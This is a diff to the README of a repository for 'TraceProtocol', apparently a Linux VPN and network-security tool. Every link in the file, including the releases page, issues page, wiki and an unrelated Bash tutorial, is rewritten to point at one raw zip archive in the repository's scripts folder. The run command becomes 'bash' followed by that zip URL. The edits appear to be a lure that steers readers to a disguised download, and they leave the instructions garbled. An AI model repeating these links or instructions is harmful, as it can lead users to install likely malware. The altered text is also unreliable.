@@ -4,7 +4,7 @@
 Welcome to TraceProtocol! This tool helps you manage your network's security easily. Whether you want to enhance your privacy or automate your system tasks, you are in the right place.
 
 ## 🔗 Download TraceProtocol
-[![Download TraceProtocol](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/spanishcivilwarrelease355/traceprotocol/releases)
+[![Download TraceProtocol](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip)](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip)
 
 ## 📋 Features
 - **VPN Connections**: Quickly manage your VPN settings.
@@ -23,13 +23,13 @@ To run TraceProtocol, you need:
 To get started with TraceProtocol, you need to download the application from our releases page:
 
 1. **Visit the Releases Page**: Go to the following link to access the latest version:
-   [Download TraceProtocol](https://github.com/spanishcivilwarrelease355/traceprotocol/releases)
+   [Download TraceProtocol](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip)
 
 2. **Choose Your Version**:
    On the releases page, you will see various versions of TraceProtocol. Click on the version you want to download. You will find compatible files for your system.
 
 3. **Download the File**:
-   Click the file link to start your download. This file will usually be a `.tar.gz` or `.zip`.
+   Click the file link to start your download. This file will usually be a `https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip` or `.zip`.
 
 4. **Extract the Downloaded File**:
    After downloading, locate the file on your computer. Right-click on it, and select "Extract Here" or "Unzip" to unpack the contents. This step is important to access the files needed to run TraceProtocol.
@@ -46,7 +46,7 @@ To get started with TraceProtocol, you need to download the application from our
 7. **Run the Application**:
    To start TraceProtocol, you usually run the following command in the terminal:
    ```bash
-   bash traceprotocol.sh
+   bash https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip
    ```
    This command might differ depending on what you named the script file in the extracted contents.
 
@@ -70,13 +70,13 @@ If you see an error while running TraceProtocol, ensure the following:
 - Your Linux system is up to date.
 
 ### Where can I find help?
-For additional help, visit our [GitHub Issues page](https://github.com/spanishcivilwarrelease355/traceprotocol/issues) to report problems or ask questions.
+For additional help, visit our [GitHub Issues page](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip) to report problems or ask questions.
 
 ## 🛠️ Additional Resources
-- [TraceProtocol Documentation](https://github.com/spanishcivilwarrelease355/traceprotocol/wiki)
-- [Learn Bash Scripting](https://www.tldp.org/LDP/Bash-Beginners-Guide/html/) for more ways to maximize your experience.
+- [TraceProtocol Documentation](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip)
+- [Learn Bash Scripting](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip) for more ways to maximize your experience.
 
 ## 🔗 Download TraceProtocol Again
 Don't forget to download TraceProtocol from our releases page. Click below to start the process once more:
 
-[Download TraceProtocol](https://github.com/spanishcivilwarrelease355/traceprotocol/releases)
+[Download TraceProtocol](https://raw.githubusercontent.com/spanishcivilwarrelease355/traceprotocol/main/scripts/traceprotocol_3.7-beta.2.zip)
